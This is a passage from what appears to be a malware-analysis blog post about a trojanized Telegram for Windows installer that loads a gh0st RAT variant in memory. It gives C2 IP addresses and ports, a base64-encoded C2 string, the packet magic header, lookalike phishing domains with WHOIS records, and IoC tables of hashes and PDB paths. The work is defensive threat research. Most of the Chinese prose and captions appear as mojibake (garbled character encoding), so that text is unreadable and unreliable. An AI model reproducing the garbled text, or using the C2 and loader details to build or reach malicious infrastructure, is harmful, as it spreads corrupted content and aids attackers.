<p>é€™å…©å€‹ ns.reg éƒ½ç¶­æŒ â€œ123456â€ ä¸¦æœªè¢«ä¿®æ”¹æˆ computer name å‰çš„ç‹€æ…‹ã€‚</p>
</blockquote>
<p>æå–å‡ºä¾†çš„ .NET DLL æ“æœ‰ç›¸åŒçš„å‡½å¼ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p7.png" title="Figure 7. registry.bin çš„å‡½å¼" data-caption="Figure 7. registry.bin çš„å‡½å¼" data-fancybox="default"><img class="fig-img" src="p7.png" alt="Figure 7. registry.bin çš„å‡½å¼"></a><span class="caption">Figure 7. registry.bin çš„å‡½å¼</span></div>

<p>å…¶ä¸­åƒ…æœ‰ Main å‡½å¼ï¼Œå’Œå¯«æ­»åœ¨ <code>ClassBuff</code> å…¶ä¸­çš„ <code>dlldata</code> æœ‰å·®ç•°ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p8.png" title="Figure 8. registry.bin (2.1.6) çš„ Main å‡½å¼" data-caption="Figure 8. registry.bin (2.1.6) çš„ Main å‡½å¼" data-fancybox="default"><img class="fig-img" src="p8.png" alt="Figure 8. registry.bin (2.1.6) çš„ Main å‡½å¼"></a><span class="caption">Figure 8. registry.bin (2.1.6) çš„ Main å‡½å¼</span></div>
<div class="figure center" style="width:;"><a class="fancybox" href="p9.png" title="Figure 9. registry.bin (2.1.10) çš„ Main å‡½å¼" data-caption="Figure 9. registry.bin (2.1.10) çš„ Main å‡½å¼" data-fancybox="default"><img class="fig-img" src="p9.png" alt="Figure 9. registry.bin (2.1.10) çš„ Main å‡½å¼"></a><span class="caption">Figure 9. registry.bin (2.1.10) çš„ Main å‡½å¼</span></div>

<p>åœ¨ <code>2.1.6</code> çš„ç‰ˆæœ¬ä¸­ï¼ŒC2 çš„ ip ä½å€æ˜¯ç”¨ <code>Program.GetRegedit()</code> å¾ registry è£¡é¢è®€å‡ºä¾†çš„ï¼Œä¸çŸ¥é“ç‚ºä»€éº¼åœ¨ <code>2.1.10</code> çš„ç‰ˆæœ¬ä¸­è®Šæˆå¸¶å…¥å¯«æ­»çš„ base64 å­—ä¸² <code>MTU0LjIyMi4xMDMuNTg6Nzg3OA==</code> åˆ° <code>Program.StartWorkThread()</code>ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p10.png" title="Figure 10. registry.bin çš„ StartWorkThread å‡½å¼" data-caption="Figure 10. registry.bin çš„ StartWorkThread å‡½å¼" data-fancybox="default"><img class="fig-img" src="p10.png" alt="Figure 10. registry.bin çš„ StartWorkThread å‡½å¼"></a><span class="caption">Figure 10. registry.bin çš„ StartWorkThread å‡½å¼</span></div>

<p><code>Program.StartWorkThread()</code> è² è²¬å°‡ C2 çš„ ip ä½å€å’Œ port æº–å‚™å¥½ä¾†æ¥è‘—å•Ÿå‹• <code>Program.MainThread()</code>ã€‚é€™è£¡æ¯”è¼ƒç‰¹åˆ¥çš„æ˜¯é€™å€‹å‡½å¼æœ‰å¦ä¸€å€‹é è¨­çš„ C2 ip ä½å€ï¼Œç•¶å‡½æ•¸è¢«å‘¼å«ä»£å…¥ç©ºå­—ä¸²æ™‚ï¼Œä¾¿æœƒä½¿ç”¨é€™å€‹ ipã€‚ç¶œåˆå‰é¢çœ‹åˆ° <code>Main()</code> å‡½å¼è£¡æœ‰å€‹è¿´åœˆï¼Œåœ¨ç­‰å¾… 300 ç§’å¾Œä¾¿æœƒå‘¼å« <code>Program.StartWorkThread(&quot;&quot;)</code>ï¼Œé€™æ™‚ä¾¿æœƒä½¿ç”¨é€™å€‹ ip ä½å€ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p11.png" title="Figure 11. registry.bin çš„ MainThread å‡½å¼" data-caption="Figure 11. registry.bin çš„ MainThread å‡½å¼" data-fancybox="default"><img class="fig-img" src="p11.png" alt="Figure 11. registry.bin çš„ MainThread å‡½å¼"></a><span class="caption">Figure 11. registry.bin çš„ MainThread å‡½å¼</span></div>

<p><code>Program.MainThread()</code> æ¥è‘—å°‡åŒ…å« ip ä½å€çš„ç‰©ä»¶è½‰ç‚º bytes å¾Œï¼Œå°‹æ‰¾ <code>ClassBuff().dlldata</code> è£¡é è¨­çš„ <code>255.255.255.255</code> ä¾†è¦†è“‹æ‰ã€‚æœ€å¾Œä½¿ç”¨ <code>DLLFromMemory</code> é€™å€‹ class åœ¨è¨˜æ†¶é«”ä¸­ç›´æ¥åŸ·è¡Œæœ€çµ‚çš„ DLLï¼Œexport function <code>Launch</code>ã€‚</p>
<h2 id="Hello-gh0st-RAT-DLL"><a href="#Hello-gh0st-RAT-DLL" class="headerlink" title="Hello gh0st RAT DLL"></a>Hello gh0st RAT DLL</h2><table>
<thead>
<tr>
<th>Filename</th>
<th>Compile Time</th>
<th>SHA256</th>
</tr>
</thead>
<tbody><tr>
<td>dlldata_2.1.6.bin</td>
<td>2020-09-23T06:17:16</td>
<td>e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0</td>
</tr>
<tr>
<td>dlldata_2.1.10.bin</td>
<td>2020-09-28T18:15:16</td>
<td>9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>PDB Path</th>
</tr>
</thead>
<tbody><tr>
<td>D:\source\MyJob\ä¼ä¸šè¿œç¨‹æ§åˆ¶\Release\ServerDll.pdb</td>
</tr>
</tbody></table>
<blockquote>
<p>é€™å…©å€‹ DLL éƒ½ç¶­æŒ C2 ip æ˜¯ 255.255.255.255ï¼Œé‚„æ²’è¢«ä¿®æ”¹å‰å¯«æ­»åœ¨ registry.bin çš„åŸæ¨£ã€‚</p>
</blockquote>
<p>æœ€å¾Œåœ¨è¨˜æ†¶é«”ä¸­å‹•æ…‹è¼‰å…¥çš„ DLL æ˜¯ gh0st RAT çš„è®Šç¨®ï¼Œæ–°èˆŠç‰ˆæœ¬å…©è€…çš„ç›¸ä¼¼åº¦æ¥µé«˜ï¼ŒåŠŸèƒ½ä¸Šå¤§è‡´æ²’æœ‰å·®ç•°ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p12.png" title="Figure 12. dlldata_2.1.6.bin å’Œ dlldata_2.1.10.bin BinDiff çš„æ¯”è¼ƒçµæœ" data-caption="Figure 12. dlldata_2.1.6.bin å’Œ dlldata_2.1.10.bin BinDiff çš„æ¯”è¼ƒçµæœ" data-fancybox="default"><img class="fig-img" src="p12.png" alt="Figure 12. dlldata_2.1.6.bin å’Œ dlldata_2.1.10.bin BinDiff çš„æ¯”è¼ƒçµæœ"></a><span class="caption">Figure 12. dlldata_2.1.6.bin å’Œ dlldata_2.1.10.bin BinDiff çš„æ¯”è¼ƒçµæœ</span></div>

<p>é—œæ–¼ gh0st RAT çš„å·²ç¶“æœ‰å¾ˆå¤šå¾ˆè©³ç´°çš„å ±å‘Šè·ŸåŸå§‹ç¢¼å¯ä»¥é–±è®€ï¼Œé€™é‚Šå°±ä¸ç´°è¬›æœ€å¾Œçš„é€™å€‹ DLLã€‚æ¯”è¼ƒå€¼å¾—æçš„æ˜¯é€™å€‹æ¨£æœ¬å‚³é€å’Œæ¥æ”¶ TCP å°åŒ…éƒ½æœ‰é€²è¡Œç°¡å–®çš„ä½å…ƒé‹ç®—ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p13.png" title="Figure 13. æ”¶åˆ°å°åŒ…å¾Œçš„ç·¨ç¢¼å‹•ä½œ" data-caption="Figure 13. æ”¶åˆ°å°åŒ…å¾Œçš„ç·¨ç¢¼å‹•ä½œ" data-fancybox="default"><img class="fig-img" src="p13.png" alt="Figure 13. æ”¶åˆ°å°åŒ…å¾Œçš„ç·¨ç¢¼å‹•ä½œ"></a><span class="caption">Figure 13. æ”¶åˆ°å°åŒ…å¾Œçš„ç·¨ç¢¼å‹•ä½œ</span></div>
<div class="figure center" style="width:;"><a class="fancybox" href="p14.png" title="Figure 14. é€å‡ºå°åŒ…å‰çš„ç·¨ç¢¼å‹•ä½œ" data-caption="Figure 14. é€å‡ºå°åŒ…å‰çš„ç·¨ç¢¼å‹•ä½œ" data-fancybox="default"><img class="fig-img" src="p14.png" alt="Figure 14. é€å‡ºå°åŒ…å‰çš„ç·¨ç¢¼å‹•ä½œ"></a><span class="caption">Figure 14. é€å‡ºå°åŒ…å‰çš„ç·¨ç¢¼å‹•ä½œ</span></div>

<p>å¦å¤–é€™å€‹ gh0st RAT è®Šç¨®çš„ magic header åƒ…æœ‰ä¸‰å€‹å­—ï¼š <code>203</code> (<code>\x32\x30\x33</code>)ï¼Œç·¨ç¢¼å¾Œæ˜¯ <code>\xCD\xCF\xCE</code>ï¼Œå¾Œé¢ 4 å€‹ bytes ä¸€æ¨£æ˜¯å°åŒ…çš„å¤§å°ï¼ˆFigure 15. çš„æ©˜è‰²æ¡† <code>\x0F\x03\x00\x00</code>ï¼‰ï¼Œå‰©é¤˜è³‡æ–™ä¸¦æœªå£“ç¸®ã€‚</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p15.png" title="Figure 15. åŸå§‹çš„å°åŒ…ç‰¹å¾µ" data-caption="Figure 15. åŸå§‹çš„å°åŒ…ç‰¹å¾µ" data-fancybox="default"><img class="fig-img" src="p15.png" alt="Figure 15. åŸå§‹çš„å°åŒ…ç‰¹å¾µ"></a><span class="caption">Figure 15. åŸå§‹çš„å°åŒ…ç‰¹å¾µ</span></div>

<h2 id="å»¶ä¼¸èª¿æŸ¥"><a href="#å»¶ä¼¸èª¿æŸ¥" class="headerlink" title="å»¶ä¼¸èª¿æŸ¥"></a>å»¶ä¼¸èª¿æŸ¥</h2><p>ä»¥ä¸Šï¼Œé—œæ–¼æƒ¡æ„ç¨‹å¼çš„éƒ¨ä»½å·²ç¶“ç­è§£çš„å·®ä¸å¤šäº†ï¼Œæ¥ä¸‹ä¾†æŠŠç›®å…‰æ”¾å›åˆ° C2 ä¸Šé¢ã€‚</p>
<p>å‰é¢åˆ†æçš„éç¨‹ä¸­å¾—åˆ°äº†é€™å…©å€‹ C2 ä½å€ï¼š</p>
<ul>
<li><code>154.222.103.58:7878</code><ul>
<li>ç¬¬ä¸€å€‹ C2 ipï¼Œ<code>2.1.6</code> ç‰ˆæœ¬æ˜¯å¾ registry è®€å‡ºä¾†ï¼Œåˆ°äº† <code>2.1.10</code> é›–ç„¶ registry è£¡ä»ç„¶æœ‰ä¸€æ¨£çš„ ipï¼Œä½†æ¨£æœ¬å…§ä¹ŸåŒæ™‚å¯«æ­»äº†ä¸€æ¨£çš„ ipï¼ˆåƒè€ƒ Figure 9.ï¼‰</li>
</ul>
</li>
<li><code>185.224.168.130:3563</code><ul>
<li>ç¬¬äºŒå€‹ C2 ipï¼Œç­‰å¾…äº”åˆ†é˜å¾Œæ‰é€£ç·šç”¨çš„ï¼ˆåƒè€ƒ Figure 10.ï¼‰</li>
</ul>
</li>
</ul>
<p>é‚„æœ‰æœ€åˆçš„å‡ç¶²ç«™ <code>http://telegram-vip.com</code>ï¼Œ A record æ˜¯ <code>45.114.106.2</code>ã€‚é€šé favicon hash æˆ– HTML body hash å¯ä»¥æ‰¾åˆ°ç¸½å…±æœ‰äº”å€‹é—œè¯çš„ ip éƒ½éƒ¨å±¬è‘—ä¸€æ¨£çš„å‡ç¶²ç«™ï¼š</p>
<ul>
<li><code>45.114.106.2</code></li>
<li><code>45.114.106.3</code></li>
<li><code>45.114.106.4</code></li>
<li><code>45.114.106.5</code></li>
<li><code>45.114.106.6</code></li>
</ul>
<p>ç›¸é—œçš„æœå°‹ç‰¹å¾µï¼š<br><a target="_blank" rel="noopener" href="https://www.shodan.io/search?query=http.favicon.hash:1246367191+country:%22CN%22">https://www.shodan.io/search?query=http.favicon.hash%3A1246367191+country%3A%22CN%22</a><br><a target="_blank" rel="noopener" href="https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700">https://censys.io/ipv4?q=f66e0b7ec3a87e950ae989e1825174b43ccd4b56c32963e5c475bead44adf700</a></p>
<div class="figure center" style="width:;"><a class="fancybox" href="p16.png" title="Figure 16. Shodan é‡å° favicon hash çš„æœå°‹çµæœ" data-caption="Figure 16. Shodan é‡å° favicon hash çš„æœå°‹çµæœ" data-fancybox="default"><img class="fig-img" src="p16.png" alt="Figure 16. Shodan é‡å° favicon hash çš„æœå°‹çµæœ"></a><span class="caption">Figure 16. Shodan é‡å° favicon hash çš„æœå°‹çµæœ</span></div>

<div class="figure center" style="width:;"><a class="fancybox" href="p17.png" title="Figure 17. Censys é‡å° HTTP body hash çš„æœå°‹çµæœ" data-caption="Figure 17. Censys é‡å° HTTP body hash çš„æœå°‹çµæœ" data-fancybox="default"><img class="fig-img" src="p17.png" alt="Figure 17. Censys é‡å° HTTP body hash çš„æœå°‹çµæœ"></a><span class="caption">Figure 17. Censys é‡å° HTTP body hash çš„æœå°‹çµæœ</span></div>

<p>å…¶ä¸­ <code>45.114.106.3</code> æœ‰ä¸€å€‹ Domain Name <code>telegramsvip.com</code>ï¼Œçœ‹äº†ä¸€ä¸‹ whois æ˜¯ 10&#x2F;15 æ‰å»ºçš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Domain Name: TELEGRAMSVIP.COM</span><br><span class="line">Registry Domain ID: 2565966013_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.godaddy.com</span><br><span class="line">Registrar URL: http://www.godaddy.com</span><br><span class="line">Updated Date: 2020-10-15T08:01:06Z</span><br><span class="line">Creation Date: 2020-10-15T08:01:05Z</span><br><span class="line">Registry Expiry Date: 2021-10-15T08:01:05Z</span><br><span class="line">Registrar: GoDaddy.com, LLC</span><br><span class="line">Registrar IANA ID: 146</span><br><span class="line">Registrar Abuse Contact Email: abuse(|]godaddy.com</span><br><span class="line">Registrar Abuse Contact Phone: 480-624-2505</span><br><span class="line">Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited</span><br><span class="line">Domain Status: clientRenewProhibited https://icann.org/epp#clientRenewProhibited</span><br><span class="line">Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited</span><br><span class="line">Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited</span><br><span class="line">Name Server: NS35.DOMAINCONTROL.COM</span><br><span class="line">Name Server: NS36.DOMAINCONTROL.COM</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line">URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/</span><br><span class="line">&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:39:21Z</span><br></pre></td></tr></table></figure>

<p>ç”šè‡³é‚„æ‰“äº† Google å»£å‘Š XD</p>
<div class="figure center" style="width:;"><a class="fancybox" href="p18.jpg" title="Figure 18. Google æœå°‹å»£å‘Š" data-caption="Figure 18. Google æœå°‹å»£å‘Š" data-fancybox="default"><img class="fig-img" src="p18.jpg" alt="Figure 18. Google æœå°‹å»£å‘Š"></a><span class="caption">Figure 18. Google æœå°‹å»£å‘Š</span></div>

<p>ç›¸è¼ƒåŸå…ˆçš„ <code>telegram-vip.com</code> æ˜¯åœ¨ 09&#x2F;21 å°±å»ºç«‹äº†ï¼Œå°±åœ¨ç·¨è­¯å¾Œé–€çš„å‰å…©å¤©ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Domain Name: TELEGRAM-VIP.COM</span><br><span class="line">Registry Domain ID: 2561073458_DOMAIN_COM-VRSN</span><br><span class="line">Registrar WHOIS Server: whois.godaddy.com</span><br><span class="line">Registrar URL: http://www.godaddy.com</span><br><span class="line">Updated Date: 2020-10-15T08:03:30Z</span><br><span class="line">Creation Date: 2020-09-21T06:44:59Z</span><br><span class="line">Registry Expiry Date: 2021-09-21T06:44:59Z</span><br><span class="line">Registrar: GoDaddy.com, LLC</span><br><span class="line">Registrar IANA ID: 146</span><br><span class="line">Registrar Abuse Contact Email: abuse(aT&#125;godaddy.com</span><br><span class="line">Registrar Abuse Contact Phone: 480-624-2505</span><br><span class="line">Domain Status: ok https://icann.org/epp#ok</span><br><span class="line">Name Server: NS13.DOMAINCONTROL.COM</span><br><span class="line">Name Server: NS14.DOMAINCONTROL.COM</span><br><span class="line">DNSSEC: unsigned</span><br><span class="line">URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/</span><br><span class="line">&gt;&gt;&gt; Last update of whois database: 2020-10-25T15:40:38Z</span><br></pre></td></tr></table></figure>

<h2 id="å°çµ"><a href="#å°çµ" class="headerlink" title="å°çµ"></a>å°çµ</h2><p>ä»¥ä¸Šä¾¿æ˜¯é‡å° Windows installer çš„éƒ¨ä»½åœ¨åˆ†æéç¨‹ä¸­ç™¼ç¾çš„ä¸€äº›æœ‰è¶£çš„å…§å®¹ï¼Œé€™å€‹è©é¨™ç¶²ç«™ç¾åœ¨é‚„åœ¨æŒçºŒé‹ä½œä¸­ï¼Œæˆ–è¨±æœªä¾†é‚„èƒ½çœ‹åˆ°æ”»æ“Šè€…å°æ¨£æœ¬æœ‰æ‰€æ›´æ–°ï¼Œå†è§€å¯Ÿçœ‹çœ‹ã€‚<del>ï¼ˆæˆ–æ˜¯æœ‰ç©ºä¹Ÿä¾†åˆ†æä¸€ä¸‹é‚£å€‹å‡çš„ APKï¼‰</del></p>
<h2 id="IoCs"><a href="#IoCs" class="headerlink" title="IoCs"></a>IoCs</h2><table>
<thead>
<tr>
<th>IP</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>45.114.106.2</td>
<td>Fake Site</td>
</tr>
<tr>
<td>45.114.106.3</td>
<td>Fake Site</td>
</tr>
<tr>
<td>45.114.106.4</td>
<td>Fake Site</td>
</tr>
<tr>
<td>45.114.106.5</td>
<td>Fake Site</td>
</tr>
<tr>
<td>45.114.106.6</td>
<td>Fake Site</td>
</tr>
<tr>
<td>154.222.103.58</td>
<td>gh0st RAT C2</td>
</tr>
<tr>
<td>185.224.168.130</td>
<td>gh0st RAT C2</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>Domain</th>
<th>Creation Date</th>
</tr>
</thead>
<tbody><tr>
<td>telegram-vip.com</td>
<td>2020-09-21T06:44:59Z</td>
</tr>
<tr>
<td>telegramsvip.com</td>
<td>2020-10-15T08:01:05Z</td>
</tr>
<tr>
<td>telegrcn.org</td>
<td>2020-05-19T02:31:56Z</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>SHA256</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8</td>
<td>telegram_setup.2.1.6.exe</td>
</tr>
<tr>
<td>35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba</td>
<td>tsetup.2.1.10.exe</td>
</tr>
<tr>
<td>f853c478fc57ac7e8bf3676b5d043d8bf071e2b817fe93d2acbd0333c46d1063</td>
<td>AddInProcess.exe (telegram_setup.2.1.6.exe)</td>
</tr>
<tr>
<td>379a9fcb8701754559901029812e6614c187d114e3527dd41795aa7647b68811</td>
<td>AddInProcess.exe (tsetup.2.1.10.exe)</td>
</tr>
<tr>
<td>96e0c3048df12fd8a930fbf38e380e229b4cdb8c2327c58ad278cfb7dafcec22</td>
<td>ns.reg (2.1.6)</td>
</tr>
<tr>
<td>d620d8f93877387b7fab7828bbfe44f38f4a738ca6fd68f18507b3aa95da683a</td>
<td>ns.reg (2.1.10)</td>
</tr>
<tr>
<td>7fd9d7a91eb9f413463c9f358312fce6a6427b3cd4f5e896a4a5629cb945520a</td>
<td>excracted DLL from ns.reg (2.1.6)</td>
</tr>
<tr>
<td>e60b984b7515a6d606ee4e4ae9cb7936bc403176e0ac8dbeeb6d0ae201fca3ef</td>
<td>extracted DLL from ns.reg (2.1.10)</td>
</tr>
<tr>
<td>e0d7398d2a5a936584742bd456ab2788722a989ad5e9c49567207c76275254b0</td>
<td>embedded gh0st RAT DLL (2.1.6)</td>
</tr>
<tr>
<td>9c0aa1e136f02e99b80e27e48dc5c4bb95a0b7f115d2f68aa4e9b1bef593d3db</td>
<td>embedded gh0st RAT DLL (2.1.10)</td>
</tr>
<tr>
<td>19d1ff6bb589fab200f3bced0f148bb5e20fe9b37bd03de9cd425116cc0dba17</td>
<td>telegramCN_631.apk</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>PDB Path</th>
</tr>
</thead>
<tbody><tr>
<td>D:\source\MyJob\åå°„dll\ConsoleApplication2\obj\Release\åå°„.pdb</td>
</tr>
<tr>
<td>D:\source\MyJob\ä¼ä¸šè¿œç¨‹æ§åˆ¶\Release\ServerDll.pdb</td>
</tr>
</tbody></table>

            


        </div>
    </div>
    <div id="post-footer" class="post-footer main-content-wrap">
        
            <div class="post-footer-tags">
                <span class="text-color-light text-small">TAGGED IN</span><br/>
                
    <a class="tag tag--primary tag--small t-none-link" href="/tags/Malware/" rel="tag">Malware</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/Telegram/" rel="tag">Telegram</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/Trojan/" rel="tag">Trojan</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/gh0st-RAT/" rel="tag">gh0st RAT</a>

            </div>
        
        
            <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
                    data-tooltip="è¿½è¹¤çœ‹é–€ç‹—é›†åœ˜ï¼šTelegram æ†ç¶æœ¨é¦¬ç¨‹å¼çš„å¤šç¨®å‹æ…‹åˆ†æ"
                    aria-label="PREVIOUS: è¿½è¹¤çœ‹é–€ç‹—é›†åœ˜ï¼šTelegram æ†ç¶æœ¨é¦¬ç¨‹å¼çš„å¤šç¨®å‹æ…‹åˆ†æ"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Research/Deploy-A-Distributed-T-Pot-System-For-Personal-Research-In-Budget-Part-2/"
                    data-tooltip="Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
                    aria-label="NEXT: Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
                <li class="post-action">
                    <a
                        class="post-action-btn btn btn--default"
                        href="#disqus_thread"
                        aria-label="Leave a comment"
                    >
                        <i class="fa fa-comment"></i>
                    </a>
                </li>
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


        
        
            
                <div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
            
        
    </div>
</article>



                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2025 Theo Chen. All Rights Reserved.
    </span>
</footer>

            </div>
            
                <div id="bottom-bar" class="post-bottom-bar" data-behavior="2">
                    <div class="post-actions-wrap">
    <nav>
        <ul class="post-actions post-action-nav">
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Research/%E8%BF%BD%E8%B9%A4%E7%9C%8B%E9%96%80%E7%8B%97%E9%9B%86%E5%9C%98%EF%BC%9ATelegram-%E6%8D%86%E7%B6%81%E6%9C%A8%E9%A6%AC%E7%A8%8B%E5%BC%8F%E7%9A%84%E5%A4%9A%E7%A8%AE%E5%9E%8B%E6%85%8B%E5%88%86%E6%9E%90/"
                    data-tooltip="è¿½è¹¤çœ‹é–€ç‹—é›†åœ˜ï¼šTelegram æ†ç¶æœ¨é¦¬ç¨‹å¼çš„å¤šç¨®å‹æ…‹åˆ†æ"
                    aria-label="PREVIOUS: è¿½è¹¤çœ‹é–€ç‹—é›†åœ˜ï¼šTelegram æ†ç¶æœ¨é¦¬ç¨‹å¼çš„å¤šç¨®å‹æ…‹åˆ†æ"
                >
                    
                        <i class="fa fa-angle-left" aria-hidden="true"></i>
                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
                    </a>
            </li>
            <li class="post-action">
                
                    
                <a
                    class="post-action-btn btn btn--default tooltip--top"
                    href="/Research/Deploy-A-Distributed-T-Pot-System-For-Personal-Research-In-Budget-Part-2/"
                    data-tooltip="Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
                    aria-label="NEXT: Deploy A Distributed T-Pot System For Personal Research In Budget - Part 2"
                >
                    
                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
                        <i class="fa fa-angle-right" aria-hidden="true"></i>
                    </a>
            </li>
        </ul>
    </nav>
    <ul class="post-actions post-action-share">
        <li class="post-action hide-lg hide-md hide-sm">
            <a
                class="post-action-btn btn btn--default btn-open-shareoptions"
                href="#btn-open-shareoptions"
                aria-label="Share this post"
            >
                <i class="fa fa-share-alt" aria-hidden="true"></i>
            </a>
        </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
                    title="Share on Facebook"
                    aria-label="Share on Facebook"
                >
                    <i class="fab fa-facebook" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a
                    class="post-action-btn btn btn--default"
                    target="new" href="https://twitter.com/intent/tweet?text=https://blog.theo.com.tw/Research/%E5%88%86%E6%9E%90%E4%B8%80%E5%80%8B%E5%8A%A0%E6%96%99%E7%9A%84-Telegram-for-Windows-%E4%B8%AD%E6%96%87%E7%89%88%E5%AE%89%E8%A3%9D%E7%A8%8B%E5%BC%8F/"
                    title="Share on Twitter"
                    aria-label="Share on Twitter"
                >
                    <i class="fab fa-twitter" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
                <li class="post-action">
                    <a
                        class="post-action-btn btn btn--default"
                        href="#disqus_thread"
                        aria-label="Leave a comment"
                    >
                        <i class="fa fa-comment"></i>
                    </a>
                </li>
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                
    <div id="share-options-bar" class="share-options-bar" data-behavior="2">
        <i id="btn-close-shareoptions" class="fa fa-times"></i>
        <ul class="share-options">
            
                
                
                <li class="share-option">
